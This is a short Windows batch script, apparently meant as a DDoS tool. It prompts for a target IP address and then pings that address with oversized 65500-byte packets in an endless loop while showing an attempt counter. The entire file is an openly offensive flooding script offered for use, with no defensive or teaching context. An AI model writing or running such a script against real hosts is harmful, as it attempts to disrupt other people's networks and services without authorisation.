@echo off
set /p ip=Enter IP to ddos:
echo press any key to ddos
pause >nul
echo trying to ddos
set /a "attempt=0"
:ddos
set /a "attempt=%attempt%+1
cls
echo trying to ddos
echo attempt %attempt%
ping -l 65500 %ip%
goto ddos